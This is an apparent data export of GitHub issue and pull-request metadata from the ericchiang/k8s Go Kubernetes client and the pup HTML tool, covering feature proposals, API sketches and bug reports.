ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/32,210631238,MDExOlB1bGxSZXF1ZXN0MTA4MjE4NzMx,32,list/watch resources across all namespaces,108481,closed,TRUE,NA,NA,9,2017-02-27T22:45:39Z,2017-03-01T18:11:22Z,2017-02-28T21:08:02Z,CONTRIBUTOR,NA,Fixes https://github.com/ericchiang/k8s/issues/21,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/32/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/32/comments,https://api.github.com/repos/ericchiang/k8s/issues/32/events,https://github.com/ericchiang/k8s/pull/32,https://api.github.com/repos/ericchiang/k8s/pulls/32
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/31,209261372,MDU6SXNzdWUyMDkyNjEzNzI=,31,Add leader election examples,2342749,closed,TRUE,NA,NA,2,2017-02-21T20:20:51Z,2018-03-19T00:39:33Z,2018-01-19T18:44:31Z,OWNER,NA,Probably with the use of an outside package. Are there any reasonable lock-based leader election implementations?,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/31/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/31/comments,https://api.github.com/repos/ericchiang/k8s/issues/31/events,https://github.com/ericchiang/k8s/issues/31,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/30,207635594,MDU6SXNzdWUyMDc2MzU1OTQ=,30,Untyped watches,2342749,closed,TRUE,NA,NA,1,2017-02-14T21:03:03Z,2017-06-07T20:26:42Z,2017-06-07T20:26:42Z,OWNER,NA,"For many caching frameworks, it'd be helpful to watch an untyped value rather than a concrete type like `v1.Pod`.

Consider adding a generalized watch:

```go
type Watcher struct {}

func (w *Watcher) Close() error {}
func (w *Watcher) Next() (*versioned.Event, *runtime.Unknown, error)

func (c *Client) Watch(ctx context.Context, apiVersion, namespace string, options ...Option) (*Watcher, error)
```

This would allow packages to write generalized caching, then deserialize into concrete types later.

```go
type cacher struct {
    // method to watch a specific resource
    watch func() (*k8s.Watcher, error)

    // in memory cache or something.
}

// List lists a set of unknown
func (c *cacher) List(ctx context.Context) ([]*runtime.Unknown, error) {}

type podsCacher struct {
    cacher *cacher
}

func (c *podsCacher) ListPods(ctx context.Context) ([]*v1.Pod, error) {
    // underlying cacher holds all the caching logic.
    list, err := c.cacher.List(ctx)
    if err != nil {
        return nil, err
    }

    pods := make([]*v1.Pod, len(list))
    for i, obj := range list {
        // might check obj.TypeMeta
        var p v1.Pod
        if err := proto.Unmarshal(obj.Raw, &p); err != nil {
            return nil, err
        }
        pods[i] = &[
    }
    return pods, nli
}
```

cc @brancz @fabxc",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/30/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/30/comments,https://api.github.com/repos/ericchiang/k8s/issues/30/events,https://github.com/ericchiang/k8s/issues/30,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/29,206991780,MDU6SXNzdWUyMDY5OTE3ODA=,29,Explore OpenShift support,2342749,closed,TRUE,NA,NA,2,2017-02-11T16:41:08Z,2018-07-27T00:40:54Z,2018-07-27T00:40:54Z,OWNER,NA,"Notes:
* OpenShift publishes all there proto definitions here[0].
* Wire compatible?
* Must not be imported by default for users of the `k8s` package.
* Need to expose more methods on the `k8s.Client` so other packages can use it?
* Figure out testing strategy (is there a minikube equivalent?)
* What does support look like? I don't use OpenShift so it's hard for me to guarantee I'll keep it up to date. 

Potential API might look like:

```go
import (
    ""github.com/ericchiang/k8s""
    ""github.com/ericchiang/k8s/openshift""
)

func main() {
    // Load regular client.
    client, err := k8s.NewInClusterClient()
    if err != nil {
        // handle error
    }

    // OpenShift client is initialized using the k8s client.
    oc := openshift.NewClient(client)
    groups, err := oc.UserV1().ListGroups()
    // ...
}
```

[0] https://github.com/openshift/origin/tree/v1.5.0-alpha.2/api/protobuf-spec",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/29/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/29/comments,https://api.github.com/repos/ericchiang/k8s/issues/29/events,https://github.com/ericchiang/k8s/issues/29,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/28,206725738,MDExOlB1bGxSZXF1ZXN0MTA1NTc3ODkw,28,Fix endpoints pluralization,1946248,closed,TRUE,NA,NA,1,2017-02-10T07:19:36Z,2017-02-10T16:28:58Z,2017-02-10T16:28:58Z,CONTRIBUTOR,NA,"Fixes #27 

Two commits, in case you want one and not the other:
  - handle the special case of ""endpoints"" in pluralize()
  - fix the generated endpointses names to endpoints",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/28/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/28/comments,https://api.github.com/repos/ericchiang/k8s/issues/28/events,https://github.com/ericchiang/k8s/pull/28,https://api.github.com/repos/ericchiang/k8s/pulls/28
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/27,206724360,MDU6SXNzdWUyMDY3MjQzNjA=,27,"Pluralization of ""endpoints"" breaks API resource name",1946248,closed,TRUE,NA,NA,0,2017-02-10T07:09:02Z,2017-02-10T16:28:58Z,2017-02-10T16:28:58Z,CONTRIBUTOR,NA,"The kubernetes resource ""endpoints"" is already pluralized, which fouls up the naming of the k8s resource for API calls, resulting in ""endpointses"".",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/27/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/27/comments,https://api.github.com/repos/ericchiang/k8s/issues/27/events,https://github.com/ericchiang/k8s/issues/27,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/26,206708570,MDExOlB1bGxSZXF1ZXN0MTA1NTY2MjY4,26,"*: fix broken examples, add testing for examples, and add more comments",2342749,closed,TRUE,NA,NA,0,2017-02-10T04:53:53Z,2017-02-10T04:58:50Z,2017-02-10T04:58:50Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/26/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/26/comments,https://api.github.com/repos/ericchiang/k8s/issues/26/events,https://github.com/ericchiang/k8s/pull/26,https://api.github.com/repos/ericchiang/k8s/pulls/26
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/25,206707390,MDU6SXNzdWUyMDY3MDczOTA=,25,Clean up generation scripts,2342749,closed,TRUE,2342749,NA,1,2017-02-10T04:41:33Z,2018-01-19T18:45:00Z,2018-01-19T18:45:00Z,OWNER,NA,They run great on my machine but could probably be expanded. Consider using Makefiles for things like downloading the Kubernetes releases.,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/25/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/25/comments,https://api.github.com/repos/ericchiang/k8s/issues/25/events,https://github.com/ericchiang/k8s/issues/25,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/24,206706200,MDU6SXNzdWUyMDY3MDYyMDA=,24,List from cache behavior,2342749,closed,TRUE,NA,NA,1,2017-02-10T04:29:28Z,2018-03-19T16:25:22Z,2018-03-19T16:25:22Z,OWNER,NA,"List operations can set ""`resourceVersion=0` to allow the API server to prefer its local cache instead of guaranteeing the freshest results. Provide a convince for this and maybe even make it the default. Most apps don't care about having the absolute latest data.

Maybe something like this?

```
// DisableCaching, when provided to a list call, ensures that the API server doesn't refer
// to its internal cache of resources and queries for the freshest resources from its
// backing storage.
func DisableCaching() Option
```

Naming could probably be worked out. Maybe `DisableCache`, `NoCaching`, `SkipCache`, `LatestResults`, etc.

Pros:
* Most apps don't care about having the absolute latest data.
* Performance improvement.
* Most apps should use this anyway.

Cons:
* Extremely surprising if you write apps requiring the latest data.
* Have to provide to every API call (maybe a client setting as well?)",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/24/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/24/comments,https://api.github.com/repos/ericchiang/k8s/issues/24/events,https://github.com/ericchiang/k8s/issues/24,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/23,206627933,MDU6SXNzdWUyMDY2Mjc5MzM=,23,Any chance we can persuade you to join forces with the main go client?,647318,closed,TRUE,NA,NA,5,2017-02-09T20:58:54Z,2018-01-15T07:05:29Z,2018-01-15T07:05:29Z,NONE,NA,I hate to see duplication of effort-- what can we do at kubernetes/client-go to get you on board?,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/23/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/23/comments,https://api.github.com/repos/ericchiang/k8s/issues/23/events,https://github.com/ericchiang/k8s/issues/23,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/22,206600109,MDExOlB1bGxSZXF1ZXN0MTA1NDkzMTk1,22,add travis builds for sanity,2342749,closed,TRUE,NA,NA,0,2017-02-09T19:09:34Z,2017-02-09T19:11:05Z,2017-02-09T19:11:05Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/22/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/22/comments,https://api.github.com/repos/ericchiang/k8s/issues/22/events,https://github.com/ericchiang/k8s/pull/22,https://api.github.com/repos/ericchiang/k8s/pulls/22
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/21,203012077,MDU6SXNzdWUyMDMwMTIwNzc=,21,List and watch resources in all namespaces,2342749,closed,TRUE,NA,NA,0,2017-01-25T04:48:13Z,2017-02-28T21:08:02Z,2017-02-28T21:08:02Z,OWNER,NA,"Probably something like:

```
func (c *CoreV1) ListPods(ctx context.Context, namespace string, options ...Option) (*apiv1.PodList, error)
func (c *CoreV1) ListAllPods(ctx context.Context, options ...Option) (*apiv1.PodList, error)
// ...
func (c *CoreV1) WatchPods(ctx context.Context, namespace string, options ...Option) (*CoreV1PodWatcher, error)
func (c *CoreV1) WatchAllPods(ctx context.Context, options ...Option) (*CoreV1PodWatcher, error)
```",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/21/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/21/comments,https://api.github.com/repos/ericchiang/k8s/issues/21/events,https://github.com/ericchiang/k8s/issues/21,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/20,201189816,MDExOlB1bGxSZXF1ZXN0MTAxODA2MzA2,20,README fix in code,2342749,closed,TRUE,NA,NA,0,2017-01-17T06:50:06Z,2017-01-17T06:50:10Z,2017-01-17T06:50:10Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/20/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/20/comments,https://api.github.com/repos/ericchiang/k8s/issues/20/events,https://github.com/ericchiang/k8s/pull/20,https://api.github.com/repos/ericchiang/k8s/pulls/20
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/19,201189475,MDExOlB1bGxSZXF1ZXN0MTAxODA2MDg5,19,README tweaks,2342749,closed,TRUE,NA,NA,0,2017-01-17T06:47:38Z,2017-01-17T06:48:08Z,2017-01-17T06:48:08Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/19/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/19/comments,https://api.github.com/repos/ericchiang/k8s/issues/19/events,https://github.com/ericchiang/k8s/pull/19,https://api.github.com/repos/ericchiang/k8s/pulls/19
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/18,200922518,MDExOlB1bGxSZXF1ZXN0MTAxNjI0NTEw,18,enable HTTP/2 support,2342749,closed,TRUE,NA,NA,0,2017-01-16T03:14:40Z,2017-01-16T03:16:39Z,2017-01-16T03:16:39Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/18/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/18/comments,https://api.github.com/repos/ericchiang/k8s/issues/18/events,https://github.com/ericchiang/k8s/pull/18,https://api.github.com/repos/ericchiang/k8s/pulls/18
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/17,200014720,MDExOlB1bGxSZXF1ZXN0MTAxMDEwOTk1,17,support updates to subresources,2342749,closed,TRUE,NA,NA,0,2017-01-11T06:35:03Z,2018-03-15T19:52:23Z,2018-03-15T19:52:20Z,OWNER,NA,closes #16,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/17/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/17/comments,https://api.github.com/repos/ericchiang/k8s/issues/17/events,https://github.com/ericchiang/k8s/pull/17,https://api.github.com/repos/ericchiang/k8s/pulls/17
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/16,200012836,MDU6SXNzdWUyMDAwMTI4MzY=,16,Subresource updates,2342749,closed,TRUE,NA,NA,1,2017-01-11T06:22:17Z,2018-03-19T00:25:58Z,2018-03-19T00:25:58Z,OWNER,NA,"Maybe something like this?

```
func (c *CoreV1) UpdatePodSubresource(ctx context.Context, obj *apiv1.Pod, subresource string) (*apiv1.Pod, error)
```",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/16/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/16/comments,https://api.github.com/repos/ericchiang/k8s/issues/16/events,https://github.com/ericchiang/k8s/issues/16,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/15,200010862,MDExOlB1bGxSZXF1ZXN0MTAxMDA4NTcz,15,add a discovery client for querying server version and resources,2342749,closed,TRUE,NA,NA,0,2017-01-11T06:07:10Z,2017-01-11T06:07:18Z,2017-01-11T06:07:18Z,OWNER,NA,closes #3,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/15/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/15/comments,https://api.github.com/repos/ericchiang/k8s/issues/15/events,https://github.com/ericchiang/k8s/pull/15,https://api.github.com/repos/ericchiang/k8s/pulls/15
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/14,200008182,MDU6SXNzdWUyMDAwMDgxODI=,14,track change of api/unversioned to apis/meta/v1 in 1.6,2342749,closed,TRUE,NA,NA,1,2017-01-11T05:42:37Z,2017-03-13T16:03:23Z,2017-03-13T16:03:23Z,OWNER,NA,Consider solutions which don't break existing users.,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/14/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/14/comments,https://api.github.com/repos/ericchiang/k8s/issues/14/events,https://github.com/ericchiang/k8s/issues/14,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/13,200006478,MDExOlB1bGxSZXF1ZXN0MTAxMDA1NTE3,13,generate watcher structs instead of returning an anonymous interface,2342749,closed,TRUE,NA,NA,1,2017-01-11T05:26:00Z,2017-01-11T06:08:14Z,2017-01-11T06:08:14Z,OWNER,NA,"closes #12 

cc @barakmich",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/13/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/13/comments,https://api.github.com/repos/ericchiang/k8s/issues/13/events,https://github.com/ericchiang/k8s/pull/13,https://api.github.com/repos/ericchiang/k8s/pulls/13
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/12,199700925,MDU6SXNzdWUxOTk3MDA5MjU=,12,Watch Struct Cleanup,98356,closed,TRUE,NA,NA,3,2017-01-10T00:25:32Z,2017-01-11T06:08:14Z,2017-01-11T06:08:14Z,NONE,NA,"The signature is perfectly valid, but if you're generating these...

```
func (c *CoreV1) WatchNodes(ctx context.Context, options ...Option) (interface {
    Next() (*versioned.Event, *apiv1.Node, error)
    Close() error
}, error)
```

You might as well generate these:
```
func (c *CoreV1) WatchNodes(ctx context.Context, options ...Option) (NodeWatcher, error)
type NodeWatcher interface {
    Next() (*versioned.Event, *apiv1.Node, error)
    Close() error
}
```

(Pick generated interface name to taste)",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/12/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/12/comments,https://api.github.com/repos/ericchiang/k8s/issues/12/events,https://github.com/ericchiang/k8s/issues/12,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/11,199470858,MDU6SXNzdWUxOTk0NzA4NTg=,11,"Expose raw API calls for logs, exec, etc.",2342749,open,TRUE,NA,NA,7,2017-01-09T03:24:46Z,2018-08-11T20:32:28Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/11/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/11/comments,https://api.github.com/repos/ericchiang/k8s/issues/11/events,https://github.com/ericchiang/k8s/issues/11,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/10,199460585,MDExOlB1bGxSZXF1ZXN0MTAwNjIzOTU3,10,*: add watch support,2342749,closed,TRUE,NA,NA,0,2017-01-09T00:47:54Z,2017-01-09T03:18:17Z,2017-01-09T03:18:17Z,OWNER,NA,"API looks like

```go
func (c *AutoscalingV1) WatchHorizontalPodAutoscalers(ctx context.Context, namespace string, options ...Option) (interface {
    Next() (*versioned.Event, *autoscalingv1.HorizontalPodAutoscaler, error)
    Close() error
}, error)
```

yay for anonymous interfaces.

closes #1",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/10/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/10/comments,https://api.github.com/repos/ericchiang/k8s/issues/10/events,https://github.com/ericchiang/k8s/pull/10,https://api.github.com/repos/ericchiang/k8s/pulls/10
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/9,199393178,MDExOlB1bGxSZXF1ZXN0MTAwNTg2ODQy,9,*: add support for 1.5.x,2342749,closed,TRUE,NA,NA,0,2017-01-08T00:04:28Z,2017-01-08T00:33:18Z,2017-01-08T00:33:18Z,OWNER,NA,closes https://github.com/ericchiang/k8s/issues/4,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/9/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/9/comments,https://api.github.com/repos/ericchiang/k8s/issues/9/events,https://github.com/ericchiang/k8s/pull/9,https://api.github.com/repos/ericchiang/k8s/pulls/9
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/8,196129484,MDU6SXNzdWUxOTYxMjk0ODQ=,8,Some structs should be inlined.,4750892,closed,TRUE,NA,NA,1,2016-12-16T18:52:25Z,2017-01-25T04:49:47Z,2017-01-25T04:49:47Z,NONE,NA,"`LocalObjectReference` in `v1.SecretKeySelector` should have `,inline` in its json tag.
This is likely a wrong setting of protoc.

As a result, creating and `v1.EnvVar` in a container with an env variable drawn from a secret does not work.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/8/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/8/comments,https://api.github.com/repos/ericchiang/k8s/issues/8/events,https://github.com/ericchiang/k8s/issues/8,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/7,196059179,MDExOlB1bGxSZXF1ZXN0OTgzMzQ0OTE=,7,Update functions,4750892,closed,TRUE,NA,NA,5,2016-12-16T13:28:19Z,2016-12-19T01:33:01Z,2016-12-19T01:33:01Z,NONE,NA,"This PR adds `Update...` functions for all resources.

To make this work, I had to change the protoc generator to `gogofast_out`. 
As a result lots of types have changed to pointer types.
This makes the library harder to work with. To compensate (a bit), I've added helper functions to convert primitive types to their pointer versions (e.g. `StringP(""hello world"")`) and back (e.g. `String(strPtr)`.

In the process, I've updated the kubernetes version to 1.5.1.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/7/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/7/comments,https://api.github.com/repos/ericchiang/k8s/issues/7/events,https://github.com/ericchiang/k8s/pull/7,https://api.github.com/repos/ericchiang/k8s/pulls/7
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/6,191885385,MDU6SXNzdWUxOTE4ODUzODU=,6,label selectors for list operations,2342749,closed,TRUE,NA,NA,1,2016-11-27T21:00:53Z,2016-12-19T05:59:50Z,2016-12-19T05:59:50Z,OWNER,NA,,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/6/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/6/comments,https://api.github.com/repos/ericchiang/k8s/issues/6/events,https://github.com/ericchiang/k8s/issues/6,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/5,191826331,MDU6SXNzdWUxOTE4MjYzMzE=,5,thirdpartyresource support,2342749,closed,TRUE,NA,NA,6,2016-11-26T20:56:42Z,2017-06-07T20:25:14Z,2017-06-07T20:25:14Z,OWNER,NA,"EDIT: this was added but needs more docs and examples. See initial docs here https://godoc.org/github.com/ericchiang/k8s#ThirdPartyResources

Maybe a reflect based implementation?

```go
// Object is an instance of a Kubernetes resource.
type Object interface {
    GetMetadata() *v1.ObjectMeta
}

func RegisterThirdPartyResource(apiGroup, apiVersion, resourcePlural string, obj Object) {
    // Use reflect to register the underlying type of `obj` on some global map.
}
```

Then clients could do:

```go
type OAuth2Client struct {
    *v1.TypeMeta
    Metadata *v1.ObjectMeta `json:""metadata""`

    Foo int `json:""foo""`
}

func (o *OAuth2Client) GetMetadata() { return o.Metadata }

func init() {
    k8s.RegisterThirdPartyResource(""foo.example.com"", ""v1"", ""oauth2clients"", &OAuth2Client{})
}

func main() {
    client, err := k8s.InClusterClient()
    if err != nil {
        log.Fatal(err)
    }
    oauth2Client := &OAuth2Client{
        Metadata: &v1.ObjectMeta{
            Name: ""bar"",
        },
        Foo: 2,
    }

    // Response is unmarshaled into the oauth2Client argument.
    if err := client.ThirdPartyResources().Create(context.Background(), oauth2Client); err != nil {
        log.Fatal(err)
    }
}
```",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/5/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/5/comments,https://api.github.com/repos/ericchiang/k8s/issues/5/events,https://github.com/ericchiang/k8s/issues/5,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/4,191825733,MDU6SXNzdWUxOTE4MjU3MzM=,4,versioned clients,2342749,closed,TRUE,NA,NA,0,2016-11-26T20:43:44Z,2017-01-08T00:33:18Z,2017-01-08T00:33:18Z,OWNER,NA,"This can either be done through git tags or sub-directories. Git tags would be easier, but means users can't use multiple versions of a client based off discovery information.

Maybe just generate types for every version of a Kubernetes API version ever? e.g. have both alpha and beta versions?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/4/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/4/comments,https://api.github.com/repos/ericchiang/k8s/issues/4/events,https://github.com/ericchiang/k8s/issues/4,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/3,191825672,MDU6SXNzdWUxOTE4MjU2NzI=,3,discovery support,2342749,closed,TRUE,NA,NA,0,2016-11-26T20:42:21Z,2017-01-11T06:07:18Z,2017-01-11T06:07:18Z,OWNER,NA,"Support the ability to discover what API groups are enabled on an API server, and what version of Kubernetes is being used.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/3/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/3/comments,https://api.github.com/repos/ericchiang/k8s/issues/3/events,https://github.com/ericchiang/k8s/issues/3,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/2,191825452,MDU6SXNzdWUxOTE4MjU0NTI=,2,patch/put support,2342749,closed,TRUE,NA,NA,5,2016-11-26T20:36:48Z,2017-01-11T06:23:01Z,2017-01-11T06:23:01Z,OWNER,NA,Need to determine if this is any different from JSON patch/put.,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/2/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/2/comments,https://api.github.com/repos/ericchiang/k8s/issues/2/events,https://github.com/ericchiang/k8s/issues/2,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/1,191793159,MDU6SXNzdWUxOTE3OTMxNTk=,1,watch support,2342749,closed,TRUE,NA,NA,0,2016-11-26T07:55:16Z,2017-01-09T03:18:17Z,2017-01-09T03:18:17Z,OWNER,NA,,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/1/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/1/comments,https://api.github.com/repos/ericchiang/k8s/issues/1/events,https://github.com/ericchiang/k8s/issues/1,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/153,812999498,MDU6SXNzdWU4MTI5OTk0OTg=,153, Support for future Go versions,41730,open,FALSE,NA,NA,0,2021-02-22T00:40:01Z,2021-02-22T00:40:01Z,NA,NONE,NA,"Heads up that Go 1.17 (and the just-released 1.16 without first changing GO111MODULE) won't support builds that aren't in module-aware mode.

`master` of the project already appears to be using Go modules so we just need a release tagged to ensure future builds do not break.

https://blog.golang.org/go116-module-changes",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/153/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/153/comments,https://api.github.com/repos/ericchiang/pup/issues/153/events,https://github.com/ericchiang/pup/issues/153,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/152,810731984,MDU6SXNzdWU4MTA3MzE5ODQ=,152,add on package managers,34260118,open,FALSE,NA,NA,0,2021-02-18T03:48:10Z,2021-02-18T03:48:10Z,NA,NONE,NA,I'm on Linux and would like this to be available on popular package managers.,NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/152/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/152/comments,https://api.github.com/repos/ericchiang/pup/issues/152/events,https://github.com/ericchiang/pup/issues/152,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/151,810658368,MDU6SXNzdWU4MTA2NTgzNjg=,151,feature request: preserve ordering of input elements,12960503,open,FALSE,NA,NA,0,2021-02-18T00:57:34Z,2021-02-18T00:57:34Z,NA,NONE,NA,"This behavior is somewhat confusing:

    $ echo ""<a>hello</a><span>bye</span>""| pup 'a,span'
    <a>
     hello
    </a>
    <span>
     bye
    </span>
    $ echo ""<a>hello</a><span>bye</span>""| pup 'span,a'
    <span>
     bye
    </span>
    <a>
     hello
    </a>

I expected Pup to do one pass over the input, and to interpret the "","" operator like a logical OR. In other words, the output for the second command should be the same as the output for the first command.

Someone else [commented on this recently](https://github.com/ericchiang/pup/issues/110#issuecomment-777890852).
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/151/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/151/comments,https://api.github.com/repos/ericchiang/pup/issues/151/events,https://github.com/ericchiang/pup/issues/151,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/150,810619356,MDU6SXNzdWU4MTA2MTkzNTY=,150,Is this project dead?,37674867,open,FALSE,NA,NA,1,2021-02-17T23:35:25Z,2021-03-01T18:05:07Z,NA,NONE,NA,"The last commit was 2 years ago. If it is dead, is there a maintained fork?",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/150/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/150/comments,https://api.github.com/repos/ericchiang/pup/issues/150/events,https://github.com/ericchiang/pup/issues/150,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/149,787685859,MDU6SXNzdWU3ODc2ODU4NTk=,149,":nth-child(An+B) does not work when B is a 2-digit value (10, 11, 12 etc.)",63192815,open,FALSE,NA,NA,0,2021-01-17T11:31:17Z,2021-01-17T11:36:03Z,NA,NONE,NA,"When I type something like:

```
'#table1 tbody tr:nth-child(n+13)'
```

instead of selecting rows from the 13th onwards, `pup` simply selects all the rows in the table and behaves like:

```
'#table1 tbody tr:nth-child(n)'
```

However, when B is single digit value, it behaves normally.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/149/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/149/comments,https://api.github.com/repos/ericchiang/pup/issues/149/events,https://github.com/ericchiang/pup/issues/149,NA
